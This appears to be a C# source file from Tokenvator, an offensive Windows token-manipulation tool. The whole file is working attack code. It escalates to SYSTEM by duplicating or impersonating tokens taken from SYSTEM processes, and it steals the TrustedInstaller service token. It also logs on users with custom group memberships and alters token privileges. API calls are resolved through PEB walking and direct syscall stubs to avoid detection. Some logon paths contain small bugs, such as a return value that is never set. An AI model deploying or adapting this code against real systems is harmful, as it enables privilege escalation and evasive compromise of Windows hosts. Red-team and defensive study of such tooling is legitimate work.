using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;

using DInvoke.DynamicInvoke;

using Tokenvator.Resources;
using Tokenvator.Plugins.Enumeration;
using Tokenvator.Plugins.Execution;

using MonkeyWorks.Unmanaged.Headers;
//using MonkeyWorks.Unmanaged.Libraries;

namespace Tokenvator.Plugins.AccessTokens
{
    using MonkeyWorks = MonkeyWorks.Unmanaged.Libraries.DInvoke;

    partial class TokenManipulation : AccessTokens
    {
        private Dictionary<uint, string> processes;

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Default Constructor
        /// </summary>
        /// <param name="currentProcessToken"></param>
        ////////////////////////////////////////////////////////////////////////////////
        internal TokenManipulation(IntPtr currentProcessToken) : base(currentProcessToken)
        {
            processes = new Dictionary<uint, string>();
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// IDisposable to free the allocated pointers
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        public override void Dispose()
        {
            base.Dispose();
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Default destructor
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        ~TokenManipulation()
        {
            Dispose();
        }

        #region Privilege Escalations
        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Starts a process with a duplicated SYSTEM Token
        /// No conversions required
        /// </summary>
        /// <returns>Returns true if process was successfully started</returns>
        ////////////////////////////////////////////////////////////////////////////////
        public bool GetSystem(string newProcess)
        {
            try
            {
                SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
                NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

                Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
                processes = UserSessions.EnumerateUserProcesses(false, systemAccount.ToString());
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }

            foreach (uint process in processes.Keys)
            {
                if (!OpenProcessToken((int)process))
                {
                    continue;
                }

                SetWorkingTokenToRemote();

                if (DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                {
                    SetWorkingTokenToNewToken();
                    if (StartProcessAsUser(newProcess))
                    {
                        return true;
                    }
                }
            }

            Misc.GetWin32Error("GetSystem");
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Impersonates a SYSTEM Token
        /// No conversions required
        /// </summary>
        /// <returns>Returns true if impersonated successfullly</returns>
        ////////////////////////////////////////////////////////////////////////////////
        public bool GetSystem()
        {
            try
            {
                SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
                NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

                Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
                processes = UserSessions.EnumerateUserProcesses(false, systemAccount.ToString());
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }

            foreach (uint process in processes.Keys)
            {
                if (!OpenProcessToken((int)process))
                {
                     continue;
                }

                SetWorkingTokenToRemote();

                if (ImpersonateUser())
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Impersonates a SYSTEM token w/ Trusted Installer Group by starting  
        /// the TrustedInstaller service and starting a process with it's token
        /// No conversions required
        /// </summary>
        /// <returns>Returns true if process was successfully started</returns>
        ////////////////////////////////////////////////////////////////////////////////
        public bool GetTrustedInstaller(string newProcess)
        {
            Console.WriteLine("[+] Getting NT AUTHORITY\\SYSTEM privileges");
            //This is required for duplicate token
            GetSystem();
            Console.WriteLine(" [*] Running as: {0}", WindowsIdentity.GetCurrent().Name);

            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                Misc.GetWin32Error("StartService");
                return false;
            }

            if (!OpenProcessToken((int)services.GetServiceProcessId()))
            {
                Misc.GetWin32Error("OpenProcessToken");
                return false;
            }

            SetWorkingTokenToRemote();
            if (!DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
            {
                Misc.GetWin32Error("DuplicateToken");
                return false;
            }

            SetWorkingTokenToNewToken();
            if (!StartProcessAsUser(newProcess))
            {
                Misc.GetWin32Error("StartProcessAsUser");
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Impersonates a SYSTEM token w/ Trusted Installer Group by starting  
        /// the TrustedInstaller service and stealing it token
        /// No conversions required
        /// </summary>
        /// <returns>Returns true if impersonated successfullly</returns>
        ////////////////////////////////////////////////////////////////////////////////
        public bool GetTrustedInstaller()
        {
            Console.WriteLine("[*] Getting NT AUTHORITY\\SYSTEM privileges");
            GetSystem();
            Console.WriteLine(" [+] Running as: {0}", WindowsIdentity.GetCurrent().Name);

            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                Misc.GetWin32Error("StartService");
                return false;
            }

            if (!OpenProcessToken((int)services.GetServiceProcessId()))
            {
                return false;
            }

            SetWorkingTokenToRemote();
            if (!ImpersonateUser())
            {
                return false;
            }

            return true;
        }
        #endregion

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Logs on a user to create a new token for that user
        /// Useful for impersonating NetworkService or LocalService
        /// </summary>
        /// <param name="domain"></param>
        /// <param name="username"></param>
        /// <param name="password"></param>
        /// <param name="logonType"></param>
        /// <param name="command"></param>
        /// <param name="arguments"></param>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public void LogonUser(string domain, string username, string password, Winbase.LOGON_TYPE logonType, string command, string arguments)
        {
            ////////////////////////////////////////////////////////////////////////////////
            // Call LogonUser - this will trigger a logon event, but is sometimes the better than the alternative
            // advapi32.LogonUser(username, domain, password, logonType, Winbase.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out hExistingToken)
            ////////////////////////////////////////////////////////////////////////////////

            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
            IntPtr hLogonUserW = Generic.GetExportAddress(hadvapi32, "LogonUserW");
            MonkeyWorks.advapi32.LogonUserW fLLogonUserW = (MonkeyWorks.advapi32.LogonUserW)Marshal.GetDelegateForFunctionPointer(hLogonUserW, typeof(MonkeyWorks.advapi32.LogonUserW));

            bool retVal = false;
            try
            {
                fLLogonUserW(username, domain, password, logonType, Winbase.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out hExistingToken);
            }
            catch(Exception ex)
            {
                Console.WriteLine("[-] LogonUserW Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return;
            }

            if (!retVal)
            {
                Misc.GetWin32Error("LogonUserW");
                return;
            }
            Console.WriteLine("[+] Logged On {0}", username.TrimEnd());

            if (Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE == logonType)
            {
                if (!SetTokenSessionId(Process.GetCurrentProcess().SessionId))
                {
                    Console.WriteLine(" [-] Unable to Update Token Session ID, this is likely to cause problems with this token");
                }
            }

            if (string.IsNullOrEmpty(command))
            {
                SetWorkingTokenToRemote();
                ImpersonateUser();
            }
            else
            {
                //This should probably be handled in class
                Create createProcess;
                if (0 == Process.GetCurrentProcess().SessionId)
                {
                    createProcess = CreateProcess.CreateProcessWithLogonW;
                }
                else
                {
                    createProcess = CreateProcess.CreateProcessWithTokenW;
                }

                createProcess(hExistingToken, command, arguments);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Logs on a user to create a new token for that user with custom groups
        /// Useful for doing things like getting trustedinstaller
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="domain"></param>
        /// <param name="username"></param>
        /// <param name="password"></param>
        /// <param name="groups"></param>
        /// <param name="logonType"></param>
        /// <param name="command"></param>
        /// <param name="arguments"></param>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public void LogonUser(string domain, string username, string password, string groups, Winbase.LOGON_TYPE logonType, string command, string arguments)
        {
            ////////////////////////////////////////////////////////////////////////////////
            // Create the token groups structure
            ////////////////////////////////////////////////////////////////////////////////
            
            SetWorkingTokenToSelf();

            Ntifs._TOKEN_GROUPS tokenGroups;
            Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup;
            using (CreateTokens ct = new CreateTokens(hWorkingToken))
            {
                ct.CreateTokenGroups(domain, username, out tokenGroups, out tokenPrimaryGroup, groups.Split(','));
            }

            ////////////////////////////////////////////////////////////////////////////////
            // Call LogonUserExExW which allows us to manually specify the groups
            // advapi32.LogonUserExExW(username, domain, password, logonType, Winbase.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, ref tokenGroups, out hExistingToken, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero)
            ////////////////////////////////////////////////////////////////////////////////

            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
            IntPtr hLogonUserExExW = Generic.GetExportAddress(hadvapi32, "LogonUserExExW");
            MonkeyWorks.advapi32.LogonUserExExW fLLogonUserW = (MonkeyWorks.advapi32.LogonUserExExW)Marshal.GetDelegateForFunctionPointer(hLogonUserExExW, typeof(MonkeyWorks.advapi32.LogonUserExExW));

            bool retVal = false;
            try
            {
                fLLogonUserW(username, domain, password, logonType, Winbase.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, ref tokenGroups, out hExistingToken, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
            catch(Exception ex)
            {
                Console.WriteLine("[-] LogonUserExExW Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return;
            }

            if (!retVal)
            {
                Misc.GetWin32Error("LogonUserExExW");
                return;
            }
            Console.WriteLine("[+] Logged On {0}", username.TrimEnd());

            if (Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE == logonType)
            {
                //Is this needed?
                SetWorkingTokenToRemote();
                if (!SetTokenSessionId(Process.GetCurrentProcess().SessionId))
                {
                    Console.WriteLine(" [-] Unable to Update Token Session ID, this is likely to cause problems with this token");
                }
            }

            using (DesktopACL da = new DesktopACL())
            {
                da.OpenWindow();
                da.OpenDesktop();
            }

            if (string.IsNullOrEmpty(command))
            {
                SetWorkingTokenToRemote();
                ImpersonateUser();
            }
            else
            {
                Create createProcess;
                if (0 == Process.GetCurrentProcess().SessionId)
                    createProcess = CreateProcess.CreateProcessWithLogonW;
                else
                    createProcess = CreateProcess.CreateProcessWithTokenW;

                createProcess(hExistingToken, command, arguments);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Can be use to remove groups, adding groups would require a new token
        /// Removing groups would require creating a restricted token
        /// https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokengroups
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="group"></param>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public void DisableTokenGroup(string group)
        {
            TokenInformation ti = new TokenInformation(hWorkingToken);
            ti.GetTokenGroups();
            

            IntPtr hNtAdjustGroupsToken = Generic.GetSyscallStub("NtAdjustGroupsToken");
            MonkeyWorks.ntdll.NtAdjustGroupsToken fSyscallNtAdjustGroupsToken = (MonkeyWorks.ntdll.NtAdjustGroupsToken)Marshal.GetDelegateForFunctionPointer(hNtAdjustGroupsToken, typeof(MonkeyWorks.ntdll.NtAdjustGroupsToken));

            string sid, account;
            for (int i = 0; i < ti.tokenGroups.GroupCount; i++) 
            {
                TokenInformation.ReadSidAndName(ti.tokenGroups.Groups[i].Sid, out sid, out account);
                if (string.Equals(group, account, StringComparison.OrdinalIgnoreCase))
                {
                    ti.tokenGroups.Groups[i].Attributes ^= (uint)Winnt.SE_GROUP_ENABLED;
                    break;
                }
            }

            ulong groupSize = (ulong)Marshal.SizeOf(ti.tokenGroups);

            uint ntRetVal = 0;
            try
            {
                ntRetVal = fSyscallNtAdjustGroupsToken(hWorkingToken, false, ref ti.tokenGroups, groupSize, ref ti.tokenGroups, ref groupSize);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] NtAdjustGroupsToken Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return;
            }

            Console.WriteLine("[*] Group no longer enabled");

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtAdjustGroupsToken", ntRetVal);
                return;
            }

        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Updates a privilege on an impersonation / thread token
        /// No Conversions Required
        /// </summary>
        /// <param name="privilege"></param>
        /// <param name="attribute"></param>
        ////////////////////////////////////////////////////////////////////////////////
        public void SetThreadTokenPrivilege(string privilege, Winnt.TokenPrivileges attribute)
        {
            foreach (uint t in threads)
            {
                Console.WriteLine("[*] Thread ID: " + t);
                if (!OpenThreadToken(t, Winnt.TOKEN_ALL_ACCESS))
                {
                    continue;
                }

                SetWorkingTokenToThreadToken();
                SetTokenPrivilege(privilege, attribute);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Adjusts the state of a privilege on a Token
        /// http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        /// https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        /// Converted to a mix of D/Invoke Syscalls and GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="privilege"></param>
        /// <param name="attribute"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public bool SetTokenPrivilege(string privilege, Winnt.TokenPrivileges attribute)
        {
            Console.WriteLine("[*] Adjusting Token Privilege {0} => {1}", privilege, attribute);

            ////////////////////////////////////////////////////////////////////////////////
            // Retrieves the LUID for the name of a specified privilege
            // advapi32.LookupPrivilegeValue(null, privilege, ref luid)
            ////////////////////////////////////////////////////////////////////////////////
            
            #region LookupPrivilegeValueW
            Winnt._LUID luid = new Winnt._LUID();

            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
            IntPtr hLookupPrivilegeValueW = Generic.GetExportAddress(hadvapi32, "LookupPrivilegeValueW");
            MonkeyWorks.advapi32.LookupPrivilegeValueW fLookupPrivilegeValueW = (MonkeyWorks.advapi32.LookupPrivilegeValueW)Marshal.GetDelegateForFunctionPointer(hLookupPrivilegeValueW, typeof(MonkeyWorks.advapi32.LookupPrivilegeValueW));

            bool retVal = false;
            try
            {
                retVal = fLookupPrivilegeValueW(string.Empty, privilege, ref luid);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] LookupPrivilegeValueW Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }

            if (!retVal)
            {
                Misc.GetWin32Error("LookupPrivilegeValueW");
                return false;
            }
            Console.WriteLine(" [+] Recieved luid");
            #endregion

            ////////////////////////////////////////////////////////////////////////////////
            // Adjust the token privileges to hWorkingToken
            // advapi32.AdjustTokenPrivileges(hWorkingToken, false, ref newState, (uint)Marshal.SizeOf(newState), ref previousState, out returnLength)
            ////////////////////////////////////////////////////////////////////////////////

            #region AdjustTokenPrivilege
            Console.WriteLine(" [*] AdjustTokenPrivilege");

            Winnt._LUID_AND_ATTRIBUTES luidAndAttributes = new Winnt._LUID_AND_ATTRIBUTES
            {
                Luid = luid,
                Attributes = (uint)attribute
            };
            Winnt._TOKEN_PRIVILEGES newState = new Winnt._TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = luidAndAttributes
            };
            Winnt._TOKEN_PRIVILEGES previousState = new Winnt._TOKEN_PRIVILEGES();
            
            ulong returnLength = 0;

            IntPtr hNtAdjustPrivilegesToken = Generic.GetSyscallStub("NtAdjustPrivilegesToken");
            MonkeyWorks.ntdll.NtAdjustPrivilegesToken fSyscallNtAdjustPrivilegesToken = (MonkeyWorks.ntdll.NtAdjustPrivilegesToken)Marshal.GetDelegateForFunctionPointer(hNtAdjustPrivilegesToken, typeof(MonkeyWorks.ntdll.NtAdjustPrivilegesToken));

            uint ntRetVal = 0;
            try
            {
                ntRetVal = fSyscallNtAdjustPrivilegesToken(hWorkingToken, false, ref newState, (uint)Marshal.SizeOf(newState), ref previousState, ref returnLength);
            }
            catch(Exception ex)
            {
                Console.WriteLine("[-] NtAdjustPrivilegesToken Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtAdjustPrivilegesToken", ntRetVal);
                return false;
            }
            #endregion

            Console.WriteLine(" [+] Adjusted Privilege: {0}", privilege);
            Console.WriteLine(" [+] Privilege State: {0}", attribute);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Updates the token session ID to the specified session
        /// Does this even work?
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="sessionId"></param>
        /// <returns>Return true if completed without error</returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public bool SetTokenSessionId(int sessionId)
        {
            bool exists, enabled;
            SetWorkingTokenToSelf();

            using (TokenInformation ti = new TokenInformation(hWorkingToken))
            {
                ti.CheckTokenPrivilege(Winnt.SE_TCB_NAME, out exists, out enabled);
            }

            if (!exists)
            {
                Console.WriteLine("[-] SeTcbPrivilege Does Not Exist On Token");
                return false;
            }

            SetWorkingTokenToRemote();
            if (!enabled && !SetTokenPrivilege(Winnt.SE_TCB_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
            {
                Console.WriteLine("[-] Enable SeTcbPrivilege Failed ");
                return false;
            }

            Console.WriteLine("[*] Updating Token Session ID to {0}", sessionId);

            ////////////////////////////////////////////////////////////////////////////////
            // Update the token information to the current Session ID
            // advapi32.SetTokenInformation(hWorkingToken, Winnt._TOKEN_INFORMATION_CLASS.TokenSessionId, handle.AddrOfPinnedObject(), sizeof(uint));
            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
            IntPtr hSetTokenInformation = Generic.GetExportAddress(hadvapi32, "SetTokenInformation");
            MonkeyWorks.advapi32.SetTokenInformation fSetTokenInformation = (MonkeyWorks.advapi32.SetTokenInformation)Marshal.GetDelegateForFunctionPointer(hSetTokenInformation, typeof(MonkeyWorks.advapi32.SetTokenInformation));

            GCHandle handle = new GCHandle();
            handle = GCHandle.Alloc(sessionId, GCHandleType.Pinned);
            bool retVal = false;
            try
            {
                retVal = fSetTokenInformation(hWorkingToken, Winnt._TOKEN_INFORMATION_CLASS.TokenSessionId, handle.AddrOfPinnedObject(), sizeof(uint));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] NtAdjustPrivilegesToken Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }
            finally
            {
                if (null != handle && handle.IsAllocated)
                {
                    handle.Free();
                }
            }

            if (!retVal)
            {
                Misc.GetWin32Error("SetTokenInformation");
                return false;
            }

            return true;
        }
    }
}
